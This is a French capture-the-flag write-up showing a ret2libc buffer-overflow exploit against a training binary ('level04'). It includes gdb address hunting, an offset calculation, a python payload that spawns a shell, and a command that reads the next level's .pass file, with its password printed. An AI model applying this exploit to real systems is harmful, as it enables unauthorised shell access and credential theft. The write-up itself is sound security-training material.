# Ret2libc Exploitation

En décompilant l'exécutable, on remarque qu'il n'y a aucun appel à la fonction `system`, qui permettrait de lancer un `shell`, et qu'il n'y a aucune lecture du fichier `.pass`. En revanche, on remarque un `buffer` dans la fonction `main` ainsi qu'un `get` copiant directement l'entrée utilisateur en entrée standard dans le `buffer`. Un `buffer` de `32` octets semble trop petit pour accueillir le `shell code` que nous utilisons habituellement. Nénamoins, l'exploit `Ret2libc` semble réalisable.

Pour rappel, l'exploit `Ret2libc` a pour but d'écraser l'adresse de retour de la fonction actuelle (ici `main`) pour la remplacer par l'adresse de `system` avec en argument `/bin/sh`. Nous avons donc besoin de connaître :
- l'adresse de `system`.
- l'adresse de `/bin/sh`.
- l'adresse du `buffer`.
- l'adresse de retour de la fonction `main` (`eip`).

Nous utiliserons `gdb` pour déterminer ces adresses. On peut, au préalable `break` au niveau du `get`. Cela nous permettra d'afficher la `stack` pour déterminer l'adresse du `buffer` ainsi que l'adresse de `eip`.

> Il est important de noter que le programme effectue un `fork` au lancement. Dans `gdb`, il est impératif d'utiliser la command `set follow-fork-mode child` sans quoi il sera impossible de `break` sur une instruction.
```
> gdb level04
[...]
> (gdb) set follow-fork-mode child
> (gdb) disas main
[...]
   0x08048757 <+143>:	lea    0x20(%esp),%eax
   0x0804875b <+147>:	mov    %eax,(%esp)
   0x0804875e <+150>:	call   0x80484b0 <gets@plt>
   0x08048763 <+155>:	jmp    0x804881a <main+338>
   0x08048768 <+160>:	nop
[...]
> (gdb) b *0x08048763
Breakpoint 2 at 0x8048763
> r
[...]
```

---

**Adresse de `system`**
```
> (gdb) p system 
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
```
L'adresse de `system` est `0xf7e6aed0`.

**Adresse de `/bin/sh`**
```
> (gdb) find __libc_start_main,+99999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
```
L'adresse de `/bin/sh` est `0xf7f897ec`.

---

On peut ensuite visualiser l'adresse de notre `buffer` ainsi que celle de `eip` en entrant une entrée simple en entrée standard. Nous utiliserons ici la chaîne de caractères `AAAA`. L'adresse du début du `buffer` est située à l'adresse pointée par `esp`. C'est l'argument de la fonction `get`.

```
AAAA
> (gdb) x $esp
0xffffd650:	0xffffd670
```
On peut le visualiser globalement en imprimant la `stack`.
```
> (gdb) x/20wx $esp
0xffffd650:	0xffffd670	0x00000000	0x00000000	0x00000000
                     ^
                     adresse du buffer
0xffffd660:	0x00000b80	0x00000000	0xf7fdc714	0x00000000
0xffffd670:	0x41414141	0x00000000	0x00000000	0x00000000
                     ^
                     AAAA
0xffffd680:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd690:	0x00000000	0x00000000	0x00000000	0x00000000
```
L'adresse du `buffer` est `0xffffd670`.

L'adresse de `eip` étant stockée à `ebp+0x04`, on peut l'afficher dans `gdb`.

```
> (gdb) x $ebp+0x04
0xffffd70c:	0xf7e45513
> (gdb) x 0xf7e45513
0xf7e45513 <__libc_start_main+243>:	0xe8240489
```

L'adresse de où est stocké `eip` est `0xffffd70c`.

Plus globalement :
```
> (gdb) x/48wx $esp
0xffffd650:	0xffffd670	0x00000000	0x00000000	0x00000000
                     ^
                     adresse du buffer
0xffffd660:	0x00000b80	0x00000000	0xf7fdc714	0x00000000
0xffffd670:	0x41414141	0x00000000	0x00000000	0x00000000
                     ^
                     AAAA
0xffffd680:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd690:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd6a0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd6b0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd6c0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd6d0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd6e0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd6f0:	0xf7feb620	0x00000000	0x00000000	0x00000000
0xffffd700:	0xf7fceff4	0x00000000	0x00000000	0xf7e45513
                                                         ^
                                                         eip
```
Pour connaitre le nombre de caractère necessaires afin d'atteindre `eip`, nous pouvons effectuer ce calcul :
```
nombre_de_caractères = adresse_eip - adresse_buffer
                     = 0xffffd70c - 0xffffd670
                     = 0x9c
                     = 156 (base 10)
```
Il nous faudra donc entrer `156` caractères afin d'atteindre `eip`. Nous pouvons représenter notre entrée de cette manière :
```
[156 caractères] + [adresse_system] + [adresse_retour_system] + [adresse_bin_sh]
```
Concrètement :
```
> python -c 'print "A"*156 + "\xd0\xae\xe6\xf7" + "OSEF" + "\xec\x97\xf8\xf7"' > /tmp/input
> cat /tmp/input - | ./level04
Give me some shellcode, k

whoami
level05
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```
